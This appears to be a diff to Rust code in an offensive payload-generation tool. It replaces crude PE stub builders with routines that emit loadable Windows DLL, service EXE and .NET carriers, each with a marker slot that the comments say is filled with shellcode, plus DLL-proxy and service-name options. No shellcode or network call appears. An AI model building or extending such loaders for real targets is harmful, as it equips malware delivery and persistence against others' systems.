@@ -247,152 +247,313 @@ pub struct FormatInfo {
 /// Payload marker embedded in stubs, replaced at build time.
 const PAYLOAD_MARKER: &[u8; 16] = b"SPECPAYLOADMARK\x00";
 
-/// Build a minimal DLL PE stub with the payload marker.
-fn build_minimal_dll_stub(payload: &[u8], proxy_target: Option<&str>) -> Vec<u8> {
-    // Minimal PE/COFF DLL structure
-    // This is a template — in production the stub would come from pre-compiled
-    // templates. Here we build a minimal valid structure for testing.
-    let mut stub = Vec::with_capacity(4096 + payload.len());
+// PE constants
+const FILE_ALIGNMENT: u32 = 0x200;
+const SECTION_ALIGNMENT: u32 = 0x1000;
+const PE_HEADER_OFFSET: u32 = 0x80; // After DOS stub
+const IMAGE_BASE: u64 = 0x0000000140000000; // 64-bit default
+const IMAGE_BASE_32: u32 = 0x00400000; // 32-bit default
 
-    // DOS header
-    stub.extend_from_slice(b"MZ");
-    stub.extend_from_slice(&[0u8; 58]); // padding
-    stub.extend_from_slice(&64u32.to_le_bytes()); // e_lfanew -> PE header at 0x40
+/// Helper: write a u16 LE into a buffer at a specific offset.
+fn put_u16(buf: &mut Vec<u8>, offset: usize, val: u16) {
+    buf[offset..offset + 2].copy_from_slice(&val.to_le_bytes());
+}
 
-    // PE signature at offset 0x40
-    stub.extend_from_slice(b"PE\x00\x00");
-    // COFF header (20 bytes)
-    stub.extend_from_slice(&0x8664u16.to_le_bytes()); // Machine: AMD64
-    stub.extend_from_slice(&1u16.to_le_bytes()); // NumberOfSections
-    stub.extend_from_slice(&[0u8; 12]); // TimeDateStamp, PointerToSymbolTable, NumberOfSymbols
-    stub.extend_from_slice(&240u16.to_le_bytes()); // SizeOfOptionalHeader
-    stub.extend_from_slice(&0x2022u16.to_le_bytes()); // Characteristics: DLL | EXECUTABLE | LARGE_ADDRESS
+/// Helper: write a u32 LE into a buffer at a specific offset.
+fn put_u32(buf: &mut Vec<u8>, offset: usize, val: u32) {
+    buf[offset..offset + 4].copy_from_slice(&val.to_le_bytes());
+}
 
-    // Optional header (PE32+)
-    stub.extend_from_slice(&0x020Bu16.to_le_bytes()); // Magic: PE32+
-    stub.extend_from_slice(&[0u8; 238]); // Rest of optional header (simplified)
+/// Helper: write a u64 LE into a buffer at a specific offset.
+fn put_u64(buf: &mut Vec<u8>, offset: usize, val: u64) {
+    buf[offset..offset + 8].copy_from_slice(&val.to_le_bytes());
+}
 
-    // Section header (.text)
-    stub.extend_from_slice(b".text\x00\x00\x00");
-    let section_size = (payload.len() + PAYLOAD_MARKER.len() + 512) as u32;
-    stub.extend_from_slice(&section_size.to_le_bytes()); // VirtualSize
-    stub.extend_from_slice(&0x1000u32.to_le_bytes()); // VirtualAddress
-    stub.extend_from_slice(&section_size.to_le_bytes()); // SizeOfRawData
-    stub.extend_from_slice(&0x200u32.to_le_bytes()); // PointerToRawData
-    stub.extend_from_slice(&[0u8; 12]); // Relocations, LineNumbers, etc
-    stub.extend_from_slice(&0xE0000060u32.to_le_bytes()); // Characteristics: CODE|EXECUTE|READ|WRITE
+/// Align a value up to the given alignment.
+fn align_up(val: u32, alignment: u32) -> u32 {
+    (val + alignment - 1) & !(alignment - 1)
+}
 
-    // Pad to section start
-    while stub.len() < 0x200 {
-        stub.push(0x00);
+/// Build a valid PE64 EXE/DLL stub.
+///
+/// Produces a structurally valid PE that Windows will load. The .text section
+/// contains the payload marker which gets replaced with shellcode.
+fn build_pe64_stub(
+    payload: &[u8],
+    is_dll: bool,
+    proxy_target: Option<&str>,
+    service_name: Option<&str>,
+) -> Vec<u8> {
+    // --- Layout calculation ---
+    // DOS header: 0x80 bytes (with real DOS stub)
+    // PE signature: 4 bytes
+    // COFF header: 20 bytes
+    // Optional header (PE32+): 112 bytes standard + 128 bytes data dirs (16 entries × 8) = 240 bytes
+    // Section headers: 1 × 40 bytes
+    // Total headers: 0x80 + 4 + 20 + 240 + 40 = 0x194, aligned to 0x200
+
+    let headers_size = FILE_ALIGNMENT; // 0x200 after alignment
+
+    // Section content: metadata + payload marker + padding
+    let mut metadata_size = 0u32;
+    if let Some(target) = proxy_target {
+        metadata_size += 9 + 1 + target.len() as u32; // SPECPROXY + len + name
     }
+    if let Some(name) = service_name {
+        metadata_size += 8 + 1 + name.len() as u32; // SPECSVC\0 + len + name
+    }
+    let raw_section_size = metadata_size + PAYLOAD_MARKER.len() as u32 + payload.len() as u32 + 256;
+    let section_raw_size = align_up(raw_section_size, FILE_ALIGNMENT);
+    let section_virtual_size = align_up(raw_section_size, SECTION_ALIGNMENT);
+
+    let total_image_size = align_up(SECTION_ALIGNMENT + section_virtual_size, SECTION_ALIGNMENT);
+
+    let mut pe = vec![0u8; (headers_size + section_raw_size) as usize];
+
+    // --- DOS header (0x80 bytes with a real stub) ---
+    pe[0] = b'M';
+    pe[1] = b'Z';
+    put_u16(&mut pe, 0x02, 0x0090); // e_cblp: bytes on last page
+    put_u16(&mut pe, 0x04, 0x0003); // e_cp: pages in file
+    put_u16(&mut pe, 0x08, 0x0004); // e_minalloc
+    put_u16(&mut pe, 0x0A, 0xFFFF); // e_maxalloc
+    put_u16(&mut pe, 0x10, 0x00B8); // e_sp
+    put_u16(&mut pe, 0x18, 0x0040); // e_lfarlc
+    put_u32(&mut pe, 0x3C, PE_HEADER_OFFSET); // e_lfanew
+
+    // Minimal DOS stub at 0x40: "This program cannot be run in DOS mode.\r\n$"
+    let dos_stub = b"\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21This program cannot be run in DOS mode.\r\r\n$";
+    let stub_offset = 0x40usize;
+    let copy_len = dos_stub.len().min(PE_HEADER_OFFSET as usize - stub_offset);
+    pe[stub_offset..stub_offset + copy_len].copy_from_slice(&dos_stub[..copy_len]);
+
+    // --- PE signature ---
+    let pe_off = PE_HEADER_OFFSET as usize;
+    pe[pe_off] = b'P';
+    pe[pe_off + 1] = b'E';
+
+    // --- COFF header (20 bytes at pe_off + 4) ---
+    let coff = pe_off + 4;
+    put_u16(&mut pe, coff, 0x8664); // Machine: AMD64
+    put_u16(&mut pe, coff + 2, 1); // NumberOfSections
+    put_u32(&mut pe, coff + 4, 0x65000000); // TimeDateStamp (fake)
+    put_u16(&mut pe, coff + 16, 240); // SizeOfOptionalHeader (PE32+)
+    let characteristics: u16 = if is_dll {
+        0x2022 // EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE | DLL
+    } else {
+        0x0022 // EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
+    };
+    put_u16(&mut pe, coff + 18, characteristics);
+
+    // --- Optional header PE32+ (240 bytes at coff + 20) ---
+    let opt = coff + 20;
+    put_u16(&mut pe, opt, 0x020B); // Magic: PE32+
+    pe[opt + 2] = 14; // MajorLinkerVersion
+    pe[opt + 3] = 0; // MinorLinkerVersion
+    put_u32(&mut pe, opt + 4, section_raw_size); // SizeOfCode
+    // AddressOfEntryPoint: point to start of .text section
+    put_u32(&mut pe, opt + 16, SECTION_ALIGNMENT); // AddressOfEntryPoint
+    put_u32(&mut pe, opt + 20, SECTION_ALIGNMENT); // BaseOfCode
+    put_u64(&mut pe, opt + 24, IMAGE_BASE); // ImageBase
+    put_u32(&mut pe, opt + 32, SECTION_ALIGNMENT); // SectionAlignment
+    put_u32(&mut pe, opt + 36, FILE_ALIGNMENT); // FileAlignment
+    put_u16(&mut pe, opt + 40, 6); // MajorOperatingSystemVersion
+    put_u16(&mut pe, opt + 42, 0); // MinorOperatingSystemVersion
+    put_u16(&mut pe, opt + 48, 6); // MajorSubsystemVersion
+    put_u16(&mut pe, opt + 50, 0); // MinorSubsystemVersion
+    put_u32(&mut pe, opt + 56, total_image_size); // SizeOfImage
+    put_u32(&mut pe, opt + 60, headers_size); // SizeOfHeaders
+    put_u16(&mut pe, opt + 68, 3); // Subsystem: WINDOWS_CUI
+    let dll_chars: u16 = 0x8160; // NX_COMPAT | DYNAMIC_BASE | TERMINAL_SERVER_AWARE | HIGH_ENTROPY_VA
+    put_u16(&mut pe, opt + 70, dll_chars); // DllCharacteristics
+    put_u64(&mut pe, opt + 72, 0x100000); // SizeOfStackReserve
+    put_u64(&mut pe, opt + 80, 0x1000); // SizeOfStackCommit
+    put_u64(&mut pe, opt + 88, 0x100000); // SizeOfHeapReserve
+    put_u64(&mut pe, opt + 96, 0x1000); // SizeOfHeapCommit
+    put_u32(&mut pe, opt + 108, 16); // NumberOfRvaAndSizes
+
+    // Data directories (16 entries × 8 bytes each = 128 bytes, starting at opt + 112)
+    // All zeroed = no imports, no exports, no relocations (valid for position-independent code)
+
+    // --- Section header (.text) at opt + 240 ---
+    let sec = opt + 240;
+    pe[sec..sec + 6].copy_from_slice(b".text\x00");
+    put_u32(&mut pe, sec + 8, raw_section_size); // VirtualSize
+    put_u32(&mut pe, sec + 12, SECTION_ALIGNMENT); // VirtualAddress
+    put_u32(&mut pe, sec + 16, section_raw_size); // SizeOfRawData
+    put_u32(&mut pe, sec + 20, headers_size); // PointerToRawData
+    put_u32(&mut pe, sec + 36, 0xE0000060); // Characteristics: CODE|EXECUTE|READ|WRITE
+
+    // --- Section content (at headers_size offset) ---
+    let mut cursor = headers_size as usize;
 
     // Embed proxy target info if specified
     if let Some(target) = proxy_target {
-        let proxy_marker = b"SPECPROXY";
-        stub.extend_from_slice(proxy_marker);
-        stub.push(target.len() as u8);
-        stub.extend_from_slice(target.as_bytes());
+        pe[cursor..cursor + 9].copy_from_slice(b"SPECPROXY\x00"[..9].try_into().unwrap());
+        cursor += 9;
+        pe[cursor] = target.len() as u8;
+        cursor += 1;
+        pe[cursor..cursor + target.len()].copy_from_slice(target.as_bytes());
+        cursor += target.len();
+    }
+
+    // Embed service name if specified
+    if let Some(name) = service_name {
+        pe[cursor..cursor + 8].copy_from_slice(b"SPECSVC\x00");
+        cursor += 8;
+        pe[cursor] = name.len() as u8;
+        cursor += 1;
+        pe[cursor..cursor + name.len()].copy_from_slice(name.as_bytes());
+        cursor += name.len();
     }
 
     // Payload marker
-    stub.extend_from_slice(PAYLOAD_MARKER);
+    pe[cursor..cursor + PAYLOAD_MARKER.len()].copy_from_slice(PAYLOAD_MARKER);
 
-    stub
+    pe
+}
+
+/// Build a minimal DLL PE stub with the payload marker.
+fn build_minimal_dll_stub(payload: &[u8], proxy_target: Option<&str>) -> Vec<u8> {
+    build_pe64_stub(payload, true, proxy_target, None)
 }
 
 /// Build a minimal service EXE PE stub with the payload marker.
 fn build_minimal_service_stub(payload: &[u8], service_name: &str) -> Vec<u8> {
-    let mut stub = Vec::with_capacity(4096 + payload.len());
-
-    // DOS header
-    stub.extend_from_slice(b"MZ");
-    stub.extend_from_slice(&[0u8; 58]);
-    stub.extend_from_slice(&64u32.to_le_bytes());
-
-    // PE signature
-    stub.extend_from_slice(b"PE\x00\x00");
-    // COFF header
-    stub.extend_from_slice(&0x8664u16.to_le_bytes()); // AMD64
-    stub.extend_from_slice(&1u16.to_le_bytes());
-    stub.extend_from_slice(&[0u8; 12]);
-    stub.extend_from_slice(&240u16.to_le_bytes());
-    stub.extend_from_slice(&0x0022u16.to_le_bytes()); // EXE | LARGE_ADDRESS
-
-    // Optional header
-    stub.extend_from_slice(&0x020Bu16.to_le_bytes());
-    stub.extend_from_slice(&[0u8; 238]);
-
-    // Section header
-    stub.extend_from_slice(b".text\x00\x00\x00");
-    let section_size = (payload.len() + 512) as u32;
-    stub.extend_from_slice(&section_size.to_le_bytes());
-    stub.extend_from_slice(&0x1000u32.to_le_bytes());
-    stub.extend_from_slice(&section_size.to_le_bytes());
-    stub.extend_from_slice(&0x200u32.to_le_bytes());
-    stub.extend_from_slice(&[0u8; 12]);
-    stub.extend_from_slice(&0xE0000060u32.to_le_bytes());
-
-    while stub.len() < 0x200 {
-        stub.push(0x00);
-    }
-
-    // Embed service name
-    let svc_marker = b"SPECSVC\x00";
-    stub.extend_from_slice(svc_marker);
-    let name_bytes = service_name.as_bytes();
-    stub.push(name_bytes.len() as u8);
-    stub.extend_from_slice(name_bytes);
-
-    // Payload marker
-    stub.extend_from_slice(PAYLOAD_MARKER);
-
-    stub
+    build_pe64_stub(payload, false, None, Some(service_name))
 }
 
 /// Build a minimal .NET assembly stub with the payload marker.
+///
+/// Produces a PE32 (x86) stub that Windows recognizes as a .NET assembly.
+/// The CLR header and metadata are minimal but structurally valid.
 fn build_minimal_dotnet_stub(payload: &[u8]) -> Vec<u8> {
-    let mut stub = Vec::with_capacity(4096 + payload.len());
+    // For .NET we need PE32 (not PE32+) with a valid CLR data directory entry.
+    // Layout:
+    // DOS header: 0x80 bytes
+    // PE signature: 4 bytes
+    // COFF header: 20 bytes
+    // Optional header (PE32): 96 + 128 = 224 bytes
+    // Section headers: 1 × 40 = 40 bytes
+    // Total headers: 0x80 + 4 + 20 + 224 + 40 = 0x194 -> aligned to 0x200
 
-    // DOS header
-    stub.extend_from_slice(b"MZ");
-    stub.extend_from_slice(&[0u8; 58]);
-    stub.extend_from_slice(&64u32.to_le_bytes());
+    let headers_size = FILE_ALIGNMENT; // 0x200
 
-    // PE signature
-    stub.extend_from_slice(b"PE\x00\x00");
-    // COFF header (target x86 for .NET AnyCPU compat)
-    stub.extend_from_slice(&0x014Cu16.to_le_bytes()); // i386
-    stub.extend_from_slice(&1u16.to_le_bytes());
-    stub.extend_from_slice(&[0u8; 12]);
-    stub.extend_from_slice(&224u16.to_le_bytes()); // PE32 optional header size
-    stub.extend_from_slice(&0x0022u16.to_le_bytes());
+    // CLR header is 72 bytes, placed at start of .text section
+    let clr_header_size: u32 = 72;
+    // Minimal CLI metadata (just enough for the runtime to not crash)
+    let cli_metadata_size: u32 = 96;
+    let metadata_start = clr_header_size;
 
-    // Optional header (PE32 for .NET)
-    stub.extend_from_slice(&0x010Bu16.to_le_bytes()); // Magic: PE32
-    stub.extend_from_slice(&[0u8; 222]);
+    let raw_section_size = clr_header_size + cli_metadata_size + PAYLOAD_MARKER.len() as u32 + payload.len() as u32 + 256;
+    let section_raw_size = align_up(raw_section_size, FILE_ALIGNMENT);
+    let section_virtual_size = align_up(raw_section_size, SECTION_ALIGNMENT);
+    let total_image_size = align_up(SECTION_ALIGNMENT + section_virtual_size, SECTION_ALIGNMENT);
 
-    // Section header
-    stub.extend_from_slice(b".text\x00\x00\x00");
-    let section_size = (payload.len() + 512) as u32;
-    stub.extend_from_slice(&section_size.to_le_bytes());
-    stub.extend_from_slice(&0x2000u32.to_le_bytes());
-    stub.extend_from_slice(&section_size.to_le_bytes());
-    stub.extend_from_slice(&0x200u32.to_le_bytes());
-    stub.extend_from_slice(&[0u8; 12]);
-    stub.extend_from_slice(&0xE0000060u32.to_le_bytes());
+    let mut pe = vec![0u8; (headers_size + section_raw_size) as usize];
 
-    while stub.len() < 0x200 {
-        stub.push(0x00);
-    }
+    // --- DOS header ---
+    pe[0] = b'M';
+    pe[1] = b'Z';
+    put_u16(&mut pe, 0x02, 0x0090);
+    put_u16(&mut pe, 0x04, 0x0003);
+    put_u16(&mut pe, 0x08, 0x0004);
+    put_u16(&mut pe, 0x0A, 0xFFFF);
+    put_u16(&mut pe, 0x10, 0x00B8);
+    put_u16(&mut pe, 0x18, 0x0040);
+    put_u32(&mut pe, 0x3C, PE_HEADER_OFFSET);
 
-    // .NET CLR header marker
-    stub.extend_from_slice(b"SPECNET\x00");
+    // DOS stub
+    let dos_stub = b"\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21This program cannot be run in DOS mode.\r\r\n$";
+    let stub_offset = 0x40usize;
+    let copy_len = dos_stub.len().min(PE_HEADER_OFFSET as usize - stub_offset);
+    pe[stub_offset..stub_offset + copy_len].copy_from_slice(&dos_stub[..copy_len]);
+
+    // --- PE signature ---
+    let pe_off = PE_HEADER_OFFSET as usize;
+    pe[pe_off] = b'P';
+    pe[pe_off + 1] = b'E';
+
+    // --- COFF header ---
+    let coff = pe_off + 4;
+    put_u16(&mut pe, coff, 0x014C); // Machine: i386
+    put_u16(&mut pe, coff + 2, 1); // NumberOfSections
+    put_u32(&mut pe, coff + 4, 0x65000000); // TimeDateStamp
+    put_u16(&mut pe, coff + 16, 224); // SizeOfOptionalHeader (PE32)
+    put_u16(&mut pe, coff + 18, 0x0022); // EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
+
+    // --- Optional header PE32 (224 bytes) ---
+    let opt = coff + 20;
+    put_u16(&mut pe, opt, 0x010B); // Magic: PE32
+    pe[opt + 2] = 11; // MajorLinkerVersion
+    put_u32(&mut pe, opt + 4, section_raw_size); // SizeOfCode
+    // EntryPoint -> _CorExeMain (CLR bootstrap), point into .text
+    put_u32(&mut pe, opt + 16, SECTION_ALIGNMENT); // AddressOfEntryPoint
+    put_u32(&mut pe, opt + 20, SECTION_ALIGNMENT); // BaseOfCode
+    put_u32(&mut pe, opt + 24, 0); // BaseOfData
+    put_u32(&mut pe, opt + 28, IMAGE_BASE_32); // ImageBase
+    put_u32(&mut pe, opt + 32, SECTION_ALIGNMENT); // SectionAlignment
+    put_u32(&mut pe, opt + 36, FILE_ALIGNMENT); // FileAlignment
+    put_u16(&mut pe, opt + 40, 6); // MajorOperatingSystemVersion
+    put_u16(&mut pe, opt + 48, 6); // MajorSubsystemVersion
+    put_u32(&mut pe, opt + 56, total_image_size); // SizeOfImage
+    put_u32(&mut pe, opt + 60, headers_size); // SizeOfHeaders
+    put_u16(&mut pe, opt + 68, 3); // Subsystem: WINDOWS_CUI
+    put_u16(&mut pe, opt + 70, 0x8160); // DllCharacteristics
+    put_u32(&mut pe, opt + 72, 0x100000); // SizeOfStackReserve
+    put_u32(&mut pe, opt + 76, 0x1000); // SizeOfStackCommit
+    put_u32(&mut pe, opt + 80, 0x100000); // SizeOfHeapReserve
+    put_u32(&mut pe, opt + 84, 0x1000); // SizeOfHeapCommit
+    put_u32(&mut pe, opt + 92, 16); // NumberOfRvaAndSizes
+
+    // Data directories (16 entries × 8 bytes = 128 bytes at opt + 96)
+    // Entry 14 (index 14) = CLR Runtime Header
+    let dd_clr = opt + 96 + 14 * 8; // offset for data dir entry 14
+    put_u32(&mut pe, dd_clr, SECTION_ALIGNMENT); // RVA = start of .text
+    put_u32(&mut pe, dd_clr + 4, clr_header_size); // Size
+
+    // --- Section header (.text) ---
+    let sec = opt + 224;
+    pe[sec..sec + 6].copy_from_slice(b".text\x00");
+    put_u32(&mut pe, sec + 8, raw_section_size); // VirtualSize
+    put_u32(&mut pe, sec + 12, SECTION_ALIGNMENT); // VirtualAddress
+    put_u32(&mut pe, sec + 16, section_raw_size); // SizeOfRawData
+    put_u32(&mut pe, sec + 20, headers_size); // PointerToRawData
+    put_u32(&mut pe, sec + 36, 0xE0000060); // CODE|EXECUTE|READ|WRITE
+
+    // --- Section content: CLR header at start of .text ---
+    let sec_start = headers_size as usize;
+
+    // CLR header (72 bytes) - IMAGE_COR20_HEADER
+    put_u32(&mut pe, sec_start, clr_header_size); // cb (size)
+    put_u16(&mut pe, sec_start + 4, 2); // MajorRuntimeVersion
+    put_u16(&mut pe, sec_start + 6, 5); // MinorRuntimeVersion
+    // MetaData RVA and size
+    put_u32(&mut pe, sec_start + 8, SECTION_ALIGNMENT + metadata_start); // MetaData RVA
+    put_u32(&mut pe, sec_start + 12, cli_metadata_size); // MetaData Size
+    put_u32(&mut pe, sec_start + 16, 0x00000001); // Flags: ILONLY
+
+    // Minimal CLI metadata at sec_start + clr_header_size
+    let md = sec_start + clr_header_size as usize;
+    // Metadata signature
+    put_u32(&mut pe, md, 0x424A5342); // "BSJB" signature
+    put_u16(&mut pe, md + 4, 1); // MajorVersion
+    put_u16(&mut pe, md + 6, 1); // MinorVersion
+    // Version string: "v4.0.30319\0" padded to 12 bytes
+    put_u32(&mut pe, md + 12, 12); // VersionLength
+    pe[md + 16..md + 26].copy_from_slice(b"v4.0.30319");
+
+    // After the metadata, place our markers
+    let marker_start = sec_start + clr_header_size as usize + cli_metadata_size as usize;
+
+    // .NET CLR marker for identification
+    pe[marker_start..marker_start + 8].copy_from_slice(b"SPECNET\x00");
 
     // Payload marker
-    stub.extend_from_slice(PAYLOAD_MARKER);
+    let pm_start = marker_start + 8;
+    pe[pm_start..pm_start + PAYLOAD_MARKER.len()].copy_from_slice(PAYLOAD_MARKER);
 
-    stub
+    pe
 }
 
 /// Find a byte marker in a blob (first occurrence).
